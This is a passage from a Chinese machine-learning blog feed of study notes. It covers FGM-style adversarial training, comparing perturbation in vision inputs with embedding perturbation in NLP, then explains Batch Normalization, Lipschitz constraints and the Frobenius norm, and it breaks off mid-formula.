<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Δ</mi><mi>x</mi><mo>=</mo><mi>ϵ</mi><msub><mi mathvariant="normal">∇</mi><mi>x</mi></msub><mi>L</mi><mo>(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">;</mo><mi>θ</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">\Delta x = \epsilon \nabla _x L(x,y;\theta)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">ϵ</span><span class="mord"><span class="mord">∇</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span></span></p>
</li>
<li>
<p>标准化<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Δ</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">\Delta x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span><span class="mord mathdefault">x</span></span></span></span>:</p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Δ</mi><mi>x</mi><mo>=</mo><mi>ϵ</mi><mfrac><mrow><msub><mi mathvariant="normal">∇</mi><mi>x</mi></msub><mi>L</mi><mo>(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">;</mo><mi>θ</mi><mo>)</mo></mrow><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><msub><mi mathvariant="normal">∇</mi><mi>x</mi></msub><mi>L</mi><mo>(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">;</mo><mi>θ</mi><mo>)</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi></mrow></mfrac><mspace width="1em"/><mspace width="1em"/><mi>o</mi><mi>r</mi><mspace width="1em"/><mspace width="1em"/><mi>ϵ</mi><mi>s</mi><mi>i</mi><mi>g</mi><mi>n</mi><mo>(</mo><msub><mi mathvariant="normal">∇</mi><mi>x</mi></msub><mi>L</mi><mo>(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">;</mo><mi>θ</mi><mo>)</mo><mo>)</mo></mrow><annotation encoding="application/x-tex">\Delta x = \epsilon \frac{\nabla _x L(x,y;\theta)}{||\nabla _x L(x,y;\theta)||}\quad \quad or \quad\quad \epsilon sign(\nabla _x L(x,y;\theta))
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.363em;vertical-align:-0.936em;"></span><span class="mord mathdefault">ϵ</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">∣</span><span class="mord">∣</span><span class="mord"><span class="mord">∇</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord">∣</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">∇</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault">ϵ</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord"><span class="mord">∇</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p>
<p>即：将输入样本向着损失上升的方向再进一步，得到的对抗样本就能造成更大的损失，提高模型的错误率。</p>
</li>
<li>
<p>优化：</p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><munder><mo><mi>m</mi><mi>i</mi><mi>n</mi></mo><mi>θ</mi></munder><msub><mi>E</mi><mrow><mo>(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>)</mo><mo>∼</mo><mi>D</mi></mrow></msub><mo>[</mo><mi>L</mi><mo>(</mo><mi>x</mi><mo>+</mo><mi mathvariant="normal">Δ</mi><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">;</mo><mi>θ</mi><mo>)</mo><mo>]</mo></mrow><annotation encoding="application/x-tex">\underset{\theta}{min}E_{(x,y)\sim D}[L(x+\Delta x,y;\theta)]
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.5021079999999998em;vertical-align:-0.7521079999999999em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.65952em;"><span style="top:-2.347892em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord mathdefault">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7521079999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">)</span><span class="mrel mtight">∼</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">D</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">Δ</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mclose">]</span></span></span></span></span></p>
</li>
</ol>
<h3 id="cv-连续性-nlp-离散性">CV 连续性 &amp; NLP 离散性</h3>
<ul>
<li>
<p>CV像素为连续的实数向量，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mi mathvariant="normal">Δ</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">x+\Delta x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span><span class="mord mathdefault">x</span></span></span></span>仍可以是有意义的图像，且可以视为“扰动”</p>
<ul>
<li>CV 任务对抗训练主要是为了提高模型鲁棒性。</li>
</ul>
</li>
<li>
<p>NLP 输入为离散型one-hot向量，输入空间已经被限定，输入“扰动”也被限定。</p>
<ul>
<li><a href="https://arxiv.org/abs/1605.07725">Adversarial Training Methods for Semi-Supervised Text Classification</a> 做法是在Embedding 层添加扰动。</li>
<li>仔细思考 Embedding 层的扰动不一定等效于真实输入扰动，但是在实验中显示，在许多任务上，Embedding层的扰动能有效提高模型性能。</li>
<li>因此，<strong>在 NLP 任务中，对抗训练的角色不再是为了防御基于梯度的恶意攻击，反而更多的是作为一种 regularization，提高模型的泛化能力。</strong></li>
</ul>
</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[BN 是如何起作用的]]></title>
        <id>https://johnyin-hub.github.io/post/bn-shi-ru-he-qi-zuo-yong-de/</id>
        <link href="https://johnyin-hub.github.io/post/bn-shi-ru-he-qi-zuo-yong-de/">
        </link>
        <updated>2022-08-17T16:48:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="batch-normalization">Batch Normalization</h3>
<ul>
<li>加速训练</li>
<li>抗过拟合作用</li>
<li>允许使用更大学习率</li>
</ul>
<h3 id="bn是如何起作用的">BN是如何起作用的</h3>
<ul>
<li>
<p>早期解释：</p>
<ul>
<li>将每一层的输入分布都归一化到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>N</mi><mo>(</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">N(0,1 )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，从而减少了所谓的Interal Covariate Shift。</li>
</ul>
</li>
<li>
<p>解释不足性：</p>
<ol>
<li>不管那一层的输入都不可能严格满足正太分布。</li>
<li>该解释原理无法诠释Instance Normalization、Layer Normalization起作用原因。</li>
</ol>
</li>
<li>
<p>最近解释：<a href="https://arxiv.org/abs/1805.11604">How Does Batch Normalization Help Optimization?</a> （2018）</p>
<ul>
<li>作者认为BN主要作用是使得整个损失函数的landscape变的更为平滑，从而使得我们可以更稳定的训练。</li>
<li>主流激活函数来说，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>[</mo><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo>]</mo></mrow><annotation encoding="application/x-tex">[-1,1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span> 是非线性较强的区间，将输入的单位特征归一化为均值为0，方差为1，充分发挥激活函数的非线性能力，将特征很好的区分开来。（这个是归一化的结论，不是batch归一化的结论）</li>
<li><strong>减去均值那一项，有助于降低神经网络梯度的LL常数，而除以标准差的那一项，更多的是起到类似自适应学习率的作用，使得每个参数的更新更加同步，而不至于对某一层、某个参数过拟合。</strong>（太复杂了证明很麻烦，看结论用心领会）</li>
</ul>
</li>
</ul>
<h3 id="lipschitz-continuity利普希茨连续">Lipschitz continuity（利普希茨连续）</h3>
<ul>
<li>
<p><strong>wikipedia解释：</strong> **利普希茨连续（Lipschitz continuity）**以德国数学家<a href="https://zh.wikipedia.org/wiki/%E9%B2%81%E9%81%93%E5%A4%AB%C2%B7%E5%88%A9%E6%99%AE%E5%B8%8C%E8%8C%A8">鲁道夫·利普希茨</a>命名，是一个比通常<a href="https://zh.wikipedia.org/wiki/%E9%80%A3%E7%BA%8C%E5%87%BD%E6%95%B8">连续</a>更强的光滑性条件。直觉上，利普希茨连续函数限制了函数改变的速度，符合利普希茨条件的函数的斜率，必小于一个称为利普希茨常数的实数（该常数依函数而定）。</p>
</li>
<li>
<p><strong>粗浅理解：</strong> <strong>L 约束</strong> 我们希望模型对输入扰动是不敏感的，这通常也能提高模型泛化能力。我们希望<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mn>1</mn><mo>−</mo><mi>x</mi><mn>2</mn><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">||x1-x2||</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault">x</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">x</span><span class="mord">2</span><span class="mord">∣</span><span class="mord">∣</span></span></span></span> 很小时，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>f</mi><mi>w</mi><mo>(</mo><mi>x</mi><mn>1</mn><mo>)</mo><mo>−</mo><mi>f</mi><mi>w</mi><mo>(</mo><mi>x</mi><mn>2</mn><mo>)</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">||fw(x1)-fw(x2)||</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mord">2</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord">∣</span></span></span></span> 也尽可能的小。</p>
</li>
<li>
<p><strong>Lipschitz 公式：</strong></p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><msub><mi>f</mi><mi>w</mi></msub><mo>(</mo><msub><mi>x</mi><mn>1</mn></msub><mo>)</mo><mo>−</mo><msub><mi>f</mi><mi>w</mi></msub><mo>(</mo><msub><mi>x</mi><mn>2</mn></msub><mo>)</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo>≤</mo><mi>C</mi><mo>(</mo><mi>w</mi><mo>)</mo><mo>⋅</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mn>1</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">||f_w(x_1)-f_w(x_2)||\leq C(w) \cdot||x_1-x_2||
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">∣</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">∣</span></span></span></span></span></p>
</li>
</ul>
<p>​	   这里的$$C$$ 只与模型参数有关，并且希望$$C$$越小越好，越小意味着模型对输入扰动越不敏感，泛化性可能会更好。</p>
<ul>
<li>
<h3 id="forbenius-范数">Forbenius 范数</h3>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mtable side="right"><mlabeledtr><mtd><mtext>(1)</mtext></mtd><mtd><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>W</mi><mi mathvariant="normal">∣</mi><msub><mi mathvariant="normal">∣</mi><mi>F</mi></msub><mo>=</mo><msqrt><mrow><munder><mo>∑</mo><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></munder><msub><mi>w</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow></msqrt></mrow></mtd></mlabeledtr></mtable><annotation encoding="application/x-tex">||W||_F = \sqrt{\sum_{i,j}w_{i,j}}\tag{1}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord">∣</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.04em;vertical-align:-1.5880110000000003em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4519889999999998em;"><span class="svg-align" style="top:-5em;"><span class="pstrut" style="height:5em;"></span><span class="mord" style="padding-left:1em;"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8723309999999997em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.413777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.4119889999999997em;"><span class="pstrut" style="height:5em;"></span><span class="hide-tail" style="min-width:1.02em;height:3.08em;"><svg width='400em' height='3.08em' viewBox='0 0 400000 3240' preserveAspectRatio='xMinYMin slice'><path d='M473,2793c339.3,-1799.3,509.3,-2700,510,-2702
c3.3,-7.3,9.3,-11,18,-11H400000v40H1017.7s-90.5,478,-276.2,1466c-185.7,988,
-279.5,1483,-281.5,1485c-2,6,-10,9,-24,9c-8,0,-12,-0.7,-12,-2c0,-1.3,-5.3,-32,
-16,-92c-50.7,-293.3,-119.7,-693.3,-207,-1200c0,-1.3,-5.3,8.7,-16,30c-10.7,
21.3,-21.3,42.7,-32,64s-16,33,-16,33s-26,-26,-26,-26s76,-153,76,-153s77,-151,
77,-151c0.7,0.7,35.7,202,105,604c67.3,400.7,102,602.7,104,606z
M1001 80H400000v40H1017z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5880110000000003em;"><span></span></span></span></span></span></span><span class="tag"><span class="strut" style="height:3.04em;vertical-align:-1.5880110000000003em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">1</span></span><span class="mord">)</span></span></span></span></span></span></p>
<p>根据<strong>范数矩阵的相容性</strong>：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>A</mi><mi>B</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo>≤</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>A</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo>⋅</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>B</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">||AB||\leq ||A||\cdot||B||</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord">∣</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault">A</span><span class="mord">∣</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span 